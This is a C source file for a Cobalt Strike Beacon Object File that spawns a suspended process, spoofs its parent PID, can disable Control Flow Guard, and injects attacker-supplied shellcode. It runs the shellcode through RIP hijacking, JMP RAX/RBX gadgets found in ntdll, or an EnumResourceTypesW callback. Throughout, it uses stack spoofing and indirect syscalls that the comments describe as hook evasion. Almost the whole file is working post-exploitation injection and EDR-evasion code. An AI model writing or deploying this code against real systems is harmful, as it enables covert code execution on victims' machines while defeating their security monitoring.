/**
 * @file Bof.c
 * @brief Beacon Object File for advanced process spawning and shellcode injection
 * 
 * This BOF implements sophisticated process creation and injection techniques using:
 * - NtCreateUserProcess for process spawning
 * - PPID spoofing for parent process masquerading
 * - Multiple execution methods (RIP hijacking, gadget-based, callback)
 * - Mitigation policy manipulation (BlockDLL, CFG disable)
 * - Draugr framework for stack spoofing and indirect syscalls
 * 
 */

#include <windows.h>
#include <tlhelp32.h>

#include "Native.h"
#include "Vulcan.h"
#include "VxTable.h"
#include "Macros.h"
#include "Draugr.h"
#include "Beacon.h"
#include "Bofdefs.h"

VX_TABLE				VxTable;
SYNTHETIC_STACK_FRAME	SyntheticStackframe;

/**
 * @enum EXECUTION
 * @brief Shellcode execution methods supported by this BOF
 */
typedef enum {
	HIJACK_RIP_DIRECT,           /**< Direct RIP manipulation to shellcode address */
	HIJACK_RIP_JMP_RAX,          /**< RIP points to JMP RAX gadget, RAX holds shellcode address */
	HIJACK_RIP_JMP_RBX,          /**< RIP points to JMP RBX gadget, RBX holds shellcode address */
	HIJACK_RIP_CALLBACK_FUNCTION /**< RIP points to callback function (EnumResourceTypesW) */
} EXECUTION;


/**
 * @brief Retrieves a process ID by process name using snapshots
 * 
 * This function enumerates running processes using Toolhelp32 API and searches
 * for a process matching the specified name. Uses Draugr framework for API calls
 * to evade userland hooks.
 * 
 * @param[in] lpcwProcessName Wide-character string containing the target process name
 * @param[in,out] pdwProcessId Pointer to receive the found process ID
 * 
 * @return TRUE if process was found, FALSE otherwise
 * 
 * @note This function uses DRAUGR_API for hook evasion on Toolhelp32 APIs
 * @warning Opens a handle with PROCESS_ALL_ACCESS which may trigger detection
 */
__attribute__((always_inline)) BOOL	GetProcessIdWithNameW(
	_In_	LPCWSTR		lpcwProcessName,
	_Inout_	PDWORD		pdwProcessId
)
{
	HMODULE	hKernel32	= GetModuleHandleA("Kernel32.dll");
	if(!hKernel32) {
		return FALSE;
	}

	PVOID pCreateToolhelp32Snapshot = 	GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
	PVOID pProcess32FirstW = 			GetProcAddress(hKernel32, "Process32FirstW");
	PVOID pProcess32NextW = 			GetProcAddress(hKernel32, "Process32NextW");

	if(!pCreateToolhelp32Snapshot	||
	!pProcess32FirstW				||
	!pProcess32NextW) {
		return FALSE;
	}

	HANDLE	ProcessSnap = DRAUGR_API(pCreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, NULL);
	if (ProcessSnap == INVALID_HANDLE_VALUE) {
		DRAUGR_SYSCALL(NtClose, ProcessSnap);
		return FALSE;
	}

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (! DRAUGR_API(pProcess32FirstW, ProcessSnap, &pe32) ) {
		DRAUGR_SYSCALL(NtClose, ProcessSnap);
		return FALSE;
	}

	do
	{
		if (StrStrW(lpcwProcessName, pe32.szExeFile)) {
			DRAUGR_SYSCALL(NtClose, ProcessSnap);
			*pdwProcessId = pe32.th32ProcessID;
			return TRUE;
		}

	} while ( DRAUGR_API(pProcess32NextW, ProcessSnap, &pe32));

	DRAUGR_SYSCALL(NtClose, ProcessSnap);
	return FALSE;
}

/**
 * @brief Compares two byte buffers for equality
 * 
 * Custom implementation of memcmp to avoid dependencies on CRT functions.
 * Compares buffers from end to beginning for efficiency.
 * 
 * @param[in] Data First buffer to compare
 * @param[in] Buffer Second buffer to compare
 * @param[in] BufferSize Number of bytes to compare
 * 
 * @return TRUE if buffers are identical, FALSE otherwise
 */
BOOL _memcmp(
	_In_	PBYTE	Data,
	_In_	PBYTE	Buffer,
	_In_	DWORD	BufferSize
)
{
	while (BufferSize--) {
		if (Data[BufferSize] != Buffer[BufferSize]) {
			return FALSE;
		}
	}
	return TRUE;
}

/**
 * @brief Searches for a specific byte pattern (gadget) within a module
 * 
 * Performs linear search through module memory to locate a specific byte sequence.
 * Used to find ROP gadgets like JMP RAX (0xFF 0xE0) or JMP RBX (0xFF 0xE3).
 * 
 * @param[in] Module Base address of the module to search
 * @param[in] ModuleSize Size of the module in bytes
 * @param[in] Gadget Byte pattern to search for
 * @param[in] GadgetSize Length of the pattern in bytes
 * @param[in,out] ppGadget Pointer to receive the address of found gadget
 * 
 * @return TRUE if gadget was found, FALSE otherwise
 * 
 * @note This function performs a naive linear search, may be slow on large modules
 */
BOOL FindGadget(
	_In_	PVOID	Module,
	_In_	DWORD	ModuleSize,
	_In_	PBYTE	Gadget,
	_In_	DWORD	GadgetSize,
	_Inout_	PVOID	*ppGadget
)
{
	for (int i = 0; i < (ModuleSize - GadgetSize); i++)
	{
		if (_memcmp(
			((DWORD64)Module + i),
			Gadget,
			GadgetSize)
		)
		{
			*ppGadget = ((DWORD64)Module + i);
			return TRUE;
		}
	}

	return FALSE;
}

/**
 * @brief Main function for creating and injecting into a new process
 * 
 * This function orchestrates the complete fork-and-run attack chain:
 * 1. Resolves parent process ID for PPID spoofing (if specified)
 * 2. Configures process creation attributes (BlockDLL, CFG policies)
 * 3. Creates suspended process using NtCreateUserProcess
 * 4. Allocates memory in target process (RW or RWX based on configuration)
 * 5. Writes shellcode to allocated memory
 * 6. Configures execution method (direct RIP, gadget-based, or callback)
 * 7. Changes memory protection if needed (RW -> RX)
 * 8. Resumes process to execute shellcode
 * 
 * @param[in] lpwProcessName Path to the process to spawn (e.g., "C:\\Windows\\System32\\rundll32.exe")
 * @param[in] lpwParentProcessName Name of parent process for PPID spoofing (NULL to disable)
 * @param[in] lpwWorkingDir Working directory for the spawned process
 * @param[in] lpwCmdLine Command line arguments for the spawned process
 * @param[in] BlockDllPolicy Enable Microsoft-only DLL policy (TRUE/FALSE)
 * @param[in] DisableCfg Disable Control Flow Guard in target process (TRUE/FALSE)
 * @param[in] UseRWX Use RWX memory allocation instead of RW->RX transition (TRUE/FALSE)
 * @param[in] Execute Execution method to use (see EXECUTION enum)
 * @param[in] Shellcode Pointer to shellcode buffer
 * @param[in] ShellcodeSize Size of shellcode in bytes
 * 
 * @return STATUS_SUCCESS on success, NTSTATUS error code otherwise
 * 
 * @note All syscalls are performed through Draugr framework for evasion
 * @warning HIJACK_RIP_CALLBACK requires CFG to be disabled in target process
 * @warning PPID spoofing opens handle with PROCESS_ALL_ACCESS (high privilege)
 */
NTSTATUS	SpawnAndRun(
	_In_	LPWSTR		lpwProcessName,
	_In_	LPWSTR		lpwParentProcessName,
	_In_	LPWSTR		lpwWorkingDir,
	_In_	LPWSTR		lpwCmdLine,
	_In_	BOOL		BlockDllPolicy,
	_In_	BOOL		DisableCfg,
	_In_	BOOL		UseRWX,
	_In_	EXECUTION	Execute,
	_In_	PVOID		Shellcode,
	_In_	SIZE_T		ShellcodeSize
)
{
	NTSTATUS Status = STATUS_SUCCESS;

	DWORD	dwProcessParentId = 0;
	HANDLE	hParentProcess = NULL;

	UNICODE_STRING	ImagePath = { 0 };
	UNICODE_STRING	CurrentDirectory = { 0 };
	UNICODE_STRING	CmdLine = { 0 };

	RtlInitUnicodeString(&ImagePath, lpwProcessName);
	RtlInitUnicodeString(&CurrentDirectory, lpwWorkingDir);
	RtlInitUnicodeString(&CmdLine, lpwCmdLine);

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	Status = RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, &CurrentDirectory, &CmdLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
	if (NT_ERROR(Status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RtlCreateProcessParametersEx failed at line %d with status 0x%llx", __LINE__, Status);
		return Status;
	}

	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	/*	-------------------
		PROCESS ATTRIBUTES
		------------------- */

	DWORD NbrOfAttributes = 0;

	if (BlockDllPolicy || DisableCfg) {
		NbrOfAttributes++;
	}

	if (lpwParentProcessName) {
		NbrOfAttributes++;
			
		if (!GetProcessIdWithNameW(lpwParentProcessName, &dwProcessParentId)) {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find parent process: %ws", lpwParentProcessName);
			return STATUS_INVALID_PARAMETER_2;
		}
		// BeaconPrintf(CALLBACK_OUTPUT, "[*] Spoofing PPID with process %ws (PID: %d)", lpwParentProcessName, dwProcessParentId);

		OBJECT_ATTRIBUTES oA = { 0 };
		InitializeObjectAttributes(&oA, 0, 0, 0, 0);

		CLIENT_ID cId = { 0 };
		cId.UniqueProcess = HandleToULong(dwProcessParentId);
		Status = DRAUGR_SYSCALL(NtOpenProcess, &hParentProcess, PROCESS_ALL_ACCESS, &oA, &cId);
		if (NT_ERROR(Status)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] NtOpenProcess failed at line %d with status 0x%llx", __LINE__, Status);
			return Status;
		}
	}

	DWORD AttributeSize = sizeof(PS_ATTRIBUTE_LIST) + (NbrOfAttributes * sizeof(PS_ATTRIBUTE));

	PPS_ATTRIBUTE_LIST AttributeList = (PPS_ATTRIBUTE_LIST)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, AttributeSize);
	if (!AttributeList) {
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	DWORD64	dwProcessPolicy = 0;

	if (BlockDllPolicy) {
		// BeaconPrintf(CALLBACK_OUTPUT, "[*] Enabling Microsoft-only DLL policy");
		dwProcessPolicy |= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	}

	if (DisableCfg) {
		// BeaconPrintf(CALLBACK_OUTPUT, "[*] Disabling Control Flow Guard");
		dwProcessPolicy |= PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF;
		dwProcessPolicy |= PROCESS_CREATION_MITIGATION_POLICY2_STRICT_CONTROL_FLOW_GUARD_ALWAYS_OFF;
		dwProcessPolicy |= PROCESS_CREATION_MITIGATION_POLICY2_XTENDED_CONTROL_FLOW_GUARD_ALWAYS_OFF;
	}
			
	DWORD cx = 0;
	AttributeList->TotalLength = AttributeSize;

	AttributeList->Attributes[cx].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[cx].Size = ImagePath.Length;
	AttributeList->Attributes[cx].Value = (ULONG_PTR)ImagePath.Buffer;

	if (BlockDllPolicy || DisableCfg) {
		cx++;
		AttributeList->Attributes[cx].Attribute = 0x20010;
		AttributeList->Attributes[cx].Size = sizeof(DWORD64);
		AttributeList->Attributes[cx].Value = &dwProcessPolicy;
	}

	if (dwProcessParentId) {
		cx++;
		AttributeList->Attributes[cx].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
		AttributeList->Attributes[cx].Size = sizeof(HANDLE);
		AttributeList->Attributes[cx].Value = hParentProcess;
	}

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	Status = DRAUGR_SYSCALL(NtCreateUserProcess, &hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, AttributeList);
	if (NT_ERROR(Status)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtCreateUserProcess failed at line %d with status 0x%llx", __LINE__, Status);
		return Status;
	}

	/*	-------------------
		ALLOCATE MEMORY 
		------------------- */

	LPVOID	lpAllocatedAddress = NULL;
	SIZE_T	nTempSize = ShellcodeSize;
	if (!UseRWX) {
		Status = DRAUGR_SYSCALL(NtAllocateVirtualMemory, hProcess, &lpAllocatedAddress, 0, &nTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}
	else {
		Status = DRAUGR_SYSCALL(NtAllocateVirtualMemory, hProcess, &lpAllocatedAddress, 0, &nTempSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
	
	if (NT_ERROR(Status)) {
	    BeaconPrintf(CALLBACK_ERROR, "[!] NtAllocateVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
		return Status;
	}
	
	/*	-------------------
		WRITE SHELLCODE
		------------------- */
	SIZE_T nWrittenBytes = 0;
	Status = DRAUGR_SYSCALL(NtWriteVirtualMemory, hProcess, lpAllocatedAddress, Shellcode, ShellcodeSize, &nWrittenBytes);
	if (NT_ERROR(Status)) {
	    BeaconPrintf(CALLBACK_ERROR, "[!] NtWriteVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
		return Status;
	}

	/*	-------------------
		EXECUTE SHELLCODE
		------------------- */
	ULONG oldProtect = 0;

	switch (Execute) {
		case(HIJACK_RIP_DIRECT):
		{
			CONTEXT Ctx = { 0 };
			Ctx.ContextFlags = CONTEXT_ALL;

			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
				return Status;
			}

			Ctx.Rip = (DWORD64)lpAllocatedAddress;

			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
				return Status;
			}
			break;
		}

		case(HIJACK_RIP_JMP_RAX):
		{
			BYTE JmpRax[] = "\xFF\xE0";

			HMODULE Ntdll = GetModuleHandleA("Ntdll.dll");

			PVOID GadgetJmpRax = NULL;
			if (!FindGadget(Ntdll, MODULE_SIZE(Ntdll), &JmpRax, sizeof(JmpRax), &GadgetJmpRax)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find JMP RAX gadget in ntdll.dll");
				return STATUS_DATA_ERROR;
			}

			CONTEXT Ctx = { 0 };
			Ctx.ContextFlags = CONTEXT_ALL;

			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
				return Status;
			}

			Ctx.Rax = (DWORD64)lpAllocatedAddress;
			Ctx.Rip = (DWORD64)GadgetJmpRax;

			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
				return Status;
			}
			break;
		}

		case(HIJACK_RIP_JMP_RBX):
		{
			BYTE JmpRbx[] = "\xFF\xE3";

			HMODULE Ntdll = GetModuleHandleA("Ntdll.dll");

			PVOID GadgetJmpRbx = NULL;
			if (!FindGadget(Ntdll, MODULE_SIZE(Ntdll), &JmpRbx, sizeof(JmpRbx), &GadgetJmpRbx)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find JMP RBX gadget in ntdll.dll");
				return STATUS_DATA_ERROR;
			}

			CONTEXT Ctx = { 0 };
			Ctx.ContextFlags = CONTEXT_ALL;

			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
				return Status;
			}

			Ctx.Rbx = (DWORD64)lpAllocatedAddress;
			Ctx.Rip = (DWORD64)GadgetJmpRbx;

			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
				return Status;
			}
			break;
		}

		case(HIJACK_RIP_CALLBACK_FUNCTION):
		{
			HMODULE Kernel32 = GetModuleHandleA("Kernel32.dll");
			PVOID	CallbackFunction = GetProcAddress(Kernel32, "EnumResourceTypesW");
			if (!CallbackFunction) {
				BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find EnumResourceTypesW");
				return STATUS_PROCEDURE_NOT_FOUND;
			}

			CONTEXT Ctx = { 0 };
			Ctx.ContextFlags = CONTEXT_ALL;

			Status = DRAUGR_SYSCALL(NtGetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtGetContextThread failed with status 0x%llx", Status);
				return Status;
			}

			Ctx.Rcx = NULL;
			Ctx.Rdx = (DWORD64)lpAllocatedAddress;
			Ctx.R8 = NULL;
			Ctx.Rip = (DWORD64)CallbackFunction;

			Status = DRAUGR_SYSCALL(NtSetContextThread, hThread, &Ctx);
			if (NT_ERROR(Status)) {
				BeaconPrintf(CALLBACK_ERROR, "[!] NtSetContextThread failed with status 0x%llx", Status);
				return Status;
			}
			break;
		}
	}

	if (!UseRWX) {
		Status = DRAUGR_SYSCALL(NtProtectVirtualMemory, hProcess, &lpAllocatedAddress, &nTempSize, PAGE_EXECUTE_READ, &oldProtect);
		if (NT_ERROR(Status)) {
	    	BeaconPrintf(CALLBACK_ERROR, "[!] NtProtectVirtualMemory failed at line %d with status 0x%llx", __LINE__, Status);
			return Status;
		}
	}
	Status = DRAUGR_SYSCALL(NtResumeProcess, hProcess);
	if (NT_ERROR(Status)) {
	    BeaconPrintf(CALLBACK_ERROR, "[!] NtResumeProcess failed at line %d with status 0x%llx", __LINE__, Status);
		return Status;
	}

	return Status;
}

/**
 * @brief Main entry point for the Beacon Object File
 * 
 * This function is called by Cobalt Strike's Beacon when the BOF is executed.
 * It parses arguments from the CNA script, initializes the Draugr framework
 * and VxTable, then calls SpawnAndRun to perform the injection.
 * 
 * @param[in] Args Packed arguments from beacon_inline_execute (see BOF_spawn.cna)
 * @param[in] Len Length of the Args buffer
 * 
 * Argument structure (packed by bof_pack):
 * - Z: lpwProcessName (wide string)
 * - Z: lpwParentProcessName (wide string)
 * - Z: lpwWorkingDir (wide string)
 * - Z: lpwCmdLine (wide string)
 * - i: BlockDllPolicy (integer)
 * - i: DisableCfg (integer)
 * - i: UseRWX (integer)
 * - i: MemExec (integer - execution method)
 * - b: Shellcode (binary data)
 * 
 * @note This function initializes VxTable and Draugr before execution
 */
void go(
    _In_    char*   Args,
    _In_    int     Len
) 
{
    LPWSTR      lpwProcessName = NULL;
    LPWSTR      lpwParentProcessName = NULL;
    LPWSTR      lpwWorkingDir = NULL;
    LPWSTR      lpwCmdLine = NULL; 
	int         BlockDllPolicy  = 0;
    int         DisableCfg      = 0;
    int         UseRWX          = 0;
    int         MemExec         = 0;
    PVOID       Shellcode = NULL;
    int         ShellcodeSize = 0;
    datap       parser;

    BeaconDataParse(&parser, Args, Len);

    int   StrLen = 0;

    lpwProcessName =        (LPWSTR)BeaconDataExtract(&parser, &StrLen);
    lpwParentProcessName =  (LPWSTR)BeaconDataExtract(&parser, &StrLen);
    lpwWorkingDir =         (LPWSTR)BeaconDataExtract(&parser, &StrLen);
    lpwCmdLine =            (LPWSTR)BeaconDataExtract(&parser, &StrLen);

	/*
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF Spawn Configuration:");
    BeaconPrintf(CALLBACK_OUTPUT, "    Process name:        %ws", lpwProcessName);
    BeaconPrintf(CALLBACK_OUTPUT, "    Parent process:      %ws", lpwParentProcessName);
    BeaconPrintf(CALLBACK_OUTPUT, "    Working directory:   %ws", lpwWorkingDir);
    BeaconPrintf(CALLBACK_OUTPUT, "    Command line:        %ws\n", lpwCmdLine);
*/
    BlockDllPolicy  = BeaconDataInt(&parser);
    DisableCfg      = BeaconDataInt(&parser);
    UseRWX          = BeaconDataInt(&parser);
    MemExec         = BeaconDataInt(&parser);

/*
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Mitigation Policies:");
    BeaconPrintf(CALLBACK_OUTPUT, "    Block DLL policy:    %s", BlockDllPolicy ? "Enabled" : "Disabled");
    BeaconPrintf(CALLBACK_OUTPUT, "    Disable CFG:         %s", DisableCfg ? "Yes" : "No");
    BeaconPrintf(CALLBACK_OUTPUT, "    Use RWX memory:      %s", UseRWX ? "Yes" : "No");

    const char* execMethod[] = {"Direct RIP", "JMP RAX", "JMP RBX", "Callback Function"};
    BeaconPrintf(CALLBACK_OUTPUT, "    Execution method:    %s\n", execMethod[MemExec]);
*/
    Shellcode = BeaconDataExtract(&parser, &ShellcodeSize);
    //BeaconPrintf(CALLBACK_OUTPUT, "[*] Shellcode size: %d bytes\n", ShellcodeSize);

    if (!InitVxTable(&VxTable)) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to initialize VxTable");
		return;
	}

	if (!DraugrInit(&SyntheticStackframe)) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to initialize Draugr synthetic stack frame");
		return;
	}

    NTSTATUS Status = SpawnAndRun(
		lpwProcessName,
		lpwParentProcessName,
		lpwWorkingDir,
		lpwCmdLine,
		BlockDllPolicy,
		DisableCfg,
		UseRWX,
		MemExec,
		Shellcode,
		ShellcodeSize
    );

    if(NT_ERROR(Status)) {
        BeaconPrintf(CALLBACK_ERROR, "\n[!] BOF execution failed with NTSTATUS: 0x%llx", Status);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed successfully!");
    }
}
